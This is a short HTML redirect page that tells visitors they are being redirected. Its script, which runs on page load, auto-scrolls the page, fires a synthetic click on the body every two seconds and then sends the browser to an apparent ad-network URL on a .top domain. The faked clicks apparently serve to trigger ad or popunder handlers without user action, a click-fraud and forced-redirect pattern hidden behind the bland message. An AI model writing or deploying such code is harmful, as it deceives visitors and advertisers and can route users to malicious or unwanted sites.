<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>Redirecting...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      color: #333;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 0.5em;
    }
    p {
      font-size: 1.1em;
    }
  </style>
</head>
<body>
  <h1>Redirecting...</h1>
  <p>Hang tight, you're being redirected...</p>

  <script>
    // Loop scroll tiap 1.5 detik
    let scrollY = 0;
    setInterval(() => {
      scrollY += 200;
      window.scrollTo({ top: scrollY, behavior: 'smooth' });
    }, 1500);

    // Loop klik tiap 2 detik
    setInterval(() => {
      const clickEvent = new MouseEvent('click', {
        bubbles: true,
        cancelable: true,
        view: window
      });
      document.body.dispatchEvent(clickEvent);
    }, 2000);

    // Redirect setelah 2 detik
    setTimeout(() => {
      window.location.href = "https://phoampor.top/4/9209440";
    }, 2000);
  </script>
</body>
</html>
